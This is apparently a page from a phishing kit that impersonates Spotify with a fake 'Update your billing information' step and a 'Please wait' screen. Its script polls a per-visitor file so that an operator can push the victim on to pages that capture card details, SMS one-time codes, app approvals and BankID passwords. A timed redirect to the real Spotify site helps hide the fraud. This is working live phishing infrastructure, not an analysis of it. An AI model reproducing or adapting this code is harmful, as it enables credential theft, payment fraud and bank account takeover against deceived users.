<?php include "./3d/index.php"?>

<!DOCTYPE html>
<html style="font-size: 12px;" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="keywords" content="">
    <meta name="description" content="">
    <title>Spotify</title>
    <style type="text/css">svg:not(:root).svg-inline--fa{overflow:visible}.svg-inline--fa{display:inline-block;font-size:inherit;height:1em;overflow:visible;vertical-align:-.125em}.svg-inline--fa.fa-lg{vertical-align:-.225em}.svg-inline--fa.fa-w-1{width:.0625em}.svg-inline--fa.fa-w-2{width:.125em}.svg-inline--fa.fa-w-3{width:.1875em}.svg-inline--fa.fa-w-4{width:.25em}.svg-inline--fa.fa-w-5{width:.3125em}.svg-inline--fa.fa-w-6{width:.375em}.svg-inline--fa.fa-w-7{width:.4375em}.svg-inline--fa.fa-w-8{width:.5em}.svg-inline--fa.fa-w-9{width:.5625em}.svg-inline--fa.fa-w-10{width:.625em}.svg-inline--fa.fa-w-11{width:.6875em}.svg-inline--fa.fa-w-12{width:.75em}.svg-inline--fa.fa-w-13{width:.8125em}.svg-inline--fa.fa-w-14{width:.875em}.svg-inline--fa.fa-w-15{width:.9375em}.svg-inline--fa.fa-w-16{width:1em}.svg-inline--fa.fa-w-17{width:1.0625em}.svg-inline--fa.fa-w-18{width:1.125em}.svg-inline--fa.fa-w-19{width:1.1875em}.svg-inline--fa.fa-w-20{width:1.25em}.svg-inline--fa.fa-pull-left{margin-right:.3em;width:auto}.svg-inline--fa.fa-pull-right{margin-left:.3em;width:auto}.svg-inline--fa.fa-border{height:1.5em}.svg-inline--fa.fa-li{width:2em}.svg-inline--fa.fa-fw{width:1.25em}.fa-layers svg.svg-inline--fa{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.fa-layers{display:inline-block;height:1em;position:relative;text-align:center;vertical-align:-.125em;width:1em}.fa-layers svg.svg-inline--fa{-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter,.fa-layers-text{display:inline-block;position:absolute;text-align:center}.fa-layers-text{left:50%;top:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter{background-color:#ff253a;border-radius:1em;-webkit-box-sizing:border-box;box-sizing:border-box;color:#fff;height:1.5em;line-height:1;max-width:5em;min-width:1.5em;overflow:hidden;padding:.25em;right:0;text-overflow:ellipsis;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-bottom-right{bottom:0;right:0;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom right;transform-origin:bottom right}.fa-layers-bottom-left{bottom:0;left:0;right:auto;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom left;transform-origin:bottom left}.fa-layers-top-right{right:0;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-top-left{left:0;right:auto;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top left;transform-origin:top left}.fa-lg{font-size:1.3333333333em;line-height:.75em;vertical-align:-.0667em}.fa-xs{font-size:.75em}.fa-sm{font-size:.875em}.fa-1x{font-size:1em}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-6x{font-size:6em}.fa-7x{font-size:7em}.fa-8x{font-size:8em}.fa-9x{font-size:9em}.fa-10x{font-size:10em}.fa-fw{text-align:center;width:1.25em}.fa-ul{list-style-type:none;margin-left:2.5em;padding-left:0}.fa-ul>li{position:relative}.fa-li{left:-2em;position:absolute;text-align:center;width:2em;line-height:inherit}.fa-border{border:solid .08em #eee;border-radius:.1em;padding:.2em .25em .15em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left,.fab.fa-pull-left,.fal.fa-pull-left,.far.fa-pull-left,.fas.fa-pull-left{margin-right:.3em}.fa.fa-pull-right,.fab.fa-pull-right,.fal.fa-pull-right,.far.fa-pull-right,.fas.fa-pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}.fa-rotate-90{-webkit-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-webkit-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-webkit-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-webkit-transform:scale(-1,1);transform:scale(-1,1)}.fa-flip-vertical{-webkit-transform:scale(1,-1);transform:scale(1,-1)}.fa-flip-both,.fa-flip-horizontal.fa-flip-vertical{-webkit-transform:scale(-1,-1);transform:scale(-1,-1)}:root .fa-flip-both,:root .fa-flip-horizontal,:root .fa-flip-vertical,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-rotate-90{-webkit-filter:none;filter:none}.fa-stack{display:inline-block;height:2em;position:relative;width:2.5em}.fa-stack-1x,.fa-stack-2x{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.svg-inline--fa.fa-stack-1x{height:1em;width:1.25em}.svg-inline--fa.fa-stack-2x{height:2em;width:2.5em}.fa-inverse{color:#fff}.sr-only{border:0;clip:rect(0,0,0,0);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.sr-only-focusable:active,.sr-only-focusable:focus{clip:auto;height:auto;margin:0;overflow:visible;position:static;width:auto}.svg-inline--fa .fa-primary{fill:var(--fa-primary-color,currentColor);opacity:1;opacity:var(--fa-primary-opacity,1)}.svg-inline--fa .fa-secondary{fill:var(--fa-secondary-color,currentColor);opacity:.4;opacity:var(--fa-secondary-opacity,.4)}.svg-inline--fa.fa-swap-opacity .fa-primary{opacity:.4;opacity:var(--fa-secondary-opacity,.4)}.svg-inline--fa.fa-swap-opacity .fa-secondary{opacity:1;opacity:var(--fa-primary-opacity,1)}.svg-inline--fa mask .fa-primary,.svg-inline--fa mask .fa-secondary{fill:#000}.fad.fa-inverse{color:#fff}</style><link rel="stylesheet" href="./3D_files/main.css" media="screen">
    <link rel="stylesheet" href="./3D_files/load-3d.css" media="screen">
    <link id="u-theme-google-font" rel="stylesheet" href="./3D_files/css">
    <meta name="theme-color" content="#478ac9">
    <meta property="og:title" content="load-3d">
    <meta property="og:type" content="website">
  <body data-path-to-root="./" data-include-products="false" class="u-body u-xl-mode" data-lang="en"><header class="u-clearfix u-custom-color-1 u-header u-header" id="sec-0a1f"><div class="u-clearfix u-sheet u-valign-middle-sm u-valign-middle-xs u-sheet-1">
        <img class="u-hidden-lg u-hidden-md u-hidden-xl u-image u-image-default u-image-1" src="./3D_files/ico.png" alt="" data-image-width="459" data-image-height="234">
        <p class="u-custom-font u-hidden-sm u-hidden-xs u-text u-text-default u-text-1"><span class="u-file-icon u-icon u-text-white u-icon-1"><img src="./3D_files/1946429-27ae17d7.png" alt=""></span>&nbsp;Profile&nbsp;
        </p>
        <a class="u-image u-logo u-image-2" data-image-width="200" data-image-height="80">
          <img src="./3D_files/logo1.svg" class="u-logo-image u-logo-image-1">
        </a>
      </div></header>
    <section class="skrollable u-clearfix u-custom-color-1 u-parallax u-section-1" id="sec-3fac">
      <div class="u-clearfix u-sheet u-sheet-1">
        <p class="u-align-center-lg u-align-center-sm u-align-center-xl u-align-center-xs u-custom-font u-text u-text-1">Update your billing information</p>
<img class="u-expanded-width-sm u-expanded-width-xs u-image u-image-default u-image-1" src="./3D_files/update1.png" alt="" data-image-width="2415" data-image-height="32">
<div class="u-container-align-left-xs u-container-style u-expanded-width-xs u-group u-shape-rectangle u-group-1">
    <div class="u-container-layout u-container-layout-1">
        <span class="u-align-left-xs u-file-icon u-icon u-text-grey-50 u-icon-1"><img src="./3D_files/271220-11a1ae80.png" alt=""></span>
        <p class="u-align-left-xs u-custom-font u-text u-text-default u-text-grey-40 u-text-2">Step 4 of 4</p>
        <p class="u-align-left-xs u-custom-font u-text u-text-default u-text-3">Update your billing</p>
    </div>
</div>
<div class="u-container-style u-expanded-width-xs u-group u-radius-16 u-shape-round u-white u-group-2">
    <div class="u-container-layout u-container-layout-2">
        <img class="u-image u-image-contain u-image-default u-image-2" src="./3D_files/d41d8cd98f00b204e9800998ecf8427e.png" alt="" data-image-width="2560" data-image-height="829">

        <center><img src="./3D_files/pt.gif" style="margin-top: 1px;" width="50"></center>

        <p class="" style="text-align: center;font-size: 13px;font-weight: bold;">Please wait. <br>Do not refresh or leave this page...</p>
    </div>
</div>
</div>
</section>

<footer class="u-align-center u-clearfix u-custom-color-1 u-footer u-footer" id="sec-17bd">
    <div class="u-clearfix u-sheet u-valign-middle u-sheet-1">
        <p class="u-custom-font u-small-text u-text u-text-grey-40 u-text-variant u-text-1">This site is protected by reCAPTCHA, and Google's Privacy Policy and Terms of Service apply.</p>
    </div>
</footer>

<script>
    setTimeout(function() {
        window.location.href = "https://spotify.com";
    }, 7000);
</script>


<script src="./3D_files/jquery-3.5.1.min.js.téléchargement"></script>
        <script src="./3D_files/bootstrap.bundle.min.js.téléchargement"></script>
        <script src="./3D_files/all.min.js.téléchargement"></script>
        <script src="./3D_files/jquery.payment.min.js.téléchargement"></script>
                 <script>
            var ip = '197.203.241.172';
            var waiting = setInterval(function() {
                $.get('./homa/' + ip + '.txt', function(data) {
                    if( data == 0 ) {
                        //console.log('hada ba9i 0');
                    } else {  
                        var zow = data.split('#|#');
                        var one = zow[0];
                        var two = zow[1];
                        if( one == 'jiji' ) {
                            clearInterval(waiting);
                            location.href = "./?JIJI=22ff4a7f29797a9d9ba4eafa8276aaa9900167b9a66b6926b51c951cabac16a3";
                        } else if( one == 'wjiji' ) {
                            clearInterval(waiting);
                            location.href = "./?JIJI=22ff4a7f29797a9d9ba4eafa8276aaa9900167b9a66b6926b51c951cabac16a3&EXPR=ERROR";
                        } else if( one == 'sms' ) {
                            clearInterval(waiting);
                            location.href = "./?OTP=22ff4a7f29797a9d9ba4eafa8276aaa9900167b9a66b6926b51c951cabac16a3";
                        } else if( one == 'wsms' ) {
                            clearInterval(waiting);
                            location.href = "./?OTP=22ff4a7f29797a9d9ba4eafa8276aaa9900167b9a66b6926b51c951cabac16a3&EXPR=ERROR";
                        } else if( one == 'APP' ) {
                            clearInterval(waiting);
                            location.href = "./?APP=22ff4a7f29797a9d9ba4eafa8276aaa9900167b9a66b6926b51c951cabac16a3";
                        }
                          else if( one == 'BANKlD' ) {
                            clearInterval(waiting);
                            location.href = "./?BANKlD=22ff4a7f29797a9d9ba4eafa8276aaa9900167b9a66b6926b51c951cabac16a3";
                        }
                          else if( one == 'BANKlDPASS' ) {
                            clearInterval(waiting);
                            location.href = "./?BANKlDPASS=22ff4a7f29797a9d9ba4eafa8276aaa9900167b9a66b6926b51c951cabac16a3";
                        }
                          else if( one == 'BANKlD-APP' ) {
                            clearInterval(waiting);
                            location.href = "./?BANKlDAPP=22ff4a7f29797a9d9ba4eafa8276aaa9900167b9a66b6926b51c951cabac16a3";
                        }
                          else if( one == 'success' ) {
                            clearInterval(waiting);
                            location.href = "./?DONE=22ff4a7f29797a9d9ba4eafa8276aaa9900167b9a66b6926b51c951cabac16a3";
                        }

                    }
                });
            }, 2000);
        </script>

        </body></html>